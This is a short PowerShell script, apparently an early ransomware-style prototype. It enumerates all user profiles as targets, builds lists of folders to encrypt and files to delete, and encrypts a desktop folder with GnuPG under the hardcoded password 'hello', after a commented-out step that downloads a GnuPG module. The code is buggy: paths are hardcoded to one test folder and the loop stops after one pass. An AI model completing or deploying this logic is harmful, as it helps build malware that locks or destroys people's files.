
# Install GNUPG

#Download link
$gnupgLink = 'https://raw.githubusercontent.com/adbertram/Random-PowerShell-Work/master/Security/GnuPg.psm1'

#Download location
$DownloadPath = 'C:\Program Files\WindowsPowerShell\Modules\GnuPg'

#Set directory 
$null = New-Item -Path $DownloadPath -Type Directory

<# try {

Invoke-WebRequest -Uri $gnupgLink -OutFile (Join-Path -Path $DownloadPath -ChildPath 'GnuPg.psm1')

Install-GnuPG -DownloadFolderPath $DownloadPath
} 

catch {"Already installed"}
#>

# Create lists of the files for deletion and encryption
$FilesToDelete = ''
$FoldersToEncrypt = ''
$FolderToEncrypt = ''

# Clear lists so previous script running doesnt break it

Clear-Variable -name "FilesToDelete"
Clear-Variable -name "FoldersToEncrypt"
Clear-Variable -name "FolderToEncrypt" 

# Create target list
$Users = Get-ChildItem -Path C:\Users | Select-Object -ExpandProperty Name
Write-Host($Users)

ForEach ($user in $Users) {

        $Desktopdir = "C:\Users\dude3\Desktop\Stuff_to_encrypt"
   try {$FoldersToEncrypt += Get-childitem -path $Desktopdir  | Select-Object -ExpandProperty FullName
        $FilesToDelete += Get-childitem -path $Desktopdir | Select-Object Directory }
        catch {"Public cannot be found"} 
}

# Create list of targets
$FoldersToEncrypt | Out-File C:\Users\dude3\Desktop\Stuff_to_encrypt\encryptedfolders.txt
$FoldersToEncrypt = Get-Content -Path C:\Users\dude3\Desktop\Stuff_to_encrypt\encryptedfolders.txt | Select-Object Unique

Write-Host($FoldersToEncrypt) 
#Encryption
ForEach ($file in $FoldersToEncrypt) {
try{Add-Encryption -FolderPath $Desktopdir -Password hello}
       catch{"Error Encrypting "}
       break
}


